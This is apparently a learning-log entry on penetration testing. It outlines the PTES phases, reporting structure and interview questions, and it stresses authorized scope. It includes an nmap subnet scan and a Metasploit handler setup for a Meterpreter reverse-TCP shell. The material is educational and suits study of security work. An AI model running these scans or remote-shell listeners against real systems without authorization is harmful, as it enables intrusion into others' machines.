# Day 61 - Penetration Testing

## Goal
Learn the formal penetration testing methodology - combining reconnaissance, scanning, exploitation, and reporting into a structured engagement.

## 1. PTES Methodology
The Penetration Testing Execution Standard (PTES) defines 7 phases:
```
1. Pre-engagement   - scope, contracts, rules of engagement
2. Intelligence Gathering - OSINT, reconnaissance (Topic 59)
3. Threat Modeling   - identify high-value targets
4. Vulnerability Analysis - scanning (Topic 60)
5. Exploitation       - active attack against vulnerabilities
6. Post-Exploitation   - pivoting, persistence (authorized scope only)
7. Reporting           - document findings, impact, remediation
```

## 2. Reconnaissance & Scanning
Passive recon: OSINT, WHOIS, DNS (Topic 59)
Active recon: Nmap scanning (Topic 63 covers this in depth)
```bash
nmap -sV -sC -O 192.168.1.0/24
```

## 3. Exploitation & Post-Exploitation
Exploiting identified vulnerabilities to demonstrate real-world impact. Common tool: Metasploit Framework.
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```
Post-exploitation: privilege escalation, lateral movement, data exfiltration (within authorized scope only).

## 4. Reporting & Remediation
A pentest report includes:
- Executive Summary (non-technical, business impact focus)
- Technical Findings (vulnerability, evidence, CVSS, steps to reproduce)
- Remediation Recommendations (specific, actionable fixes)
- Risk Rating (Critical/High/Medium/Low per finding)

## Interview Questions
**Q1. Name the 7 phases of PTES.**
Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting.
**Q2. What should always be done before any penetration test?**
Signed scope/authorization documents defining exactly what is in scope, test windows, and emergency contacts.
**Q3. What is post-exploitation?**
Actions taken after gaining initial access (privilege escalation, lateral movement, data access) to demonstrate the full impact of a compromise, within the authorized scope.

## Key Takeaways
- Learned PTES methodology end-to-end
- Learned Metasploit basics for exploitation
- Learned professional pentest report structure
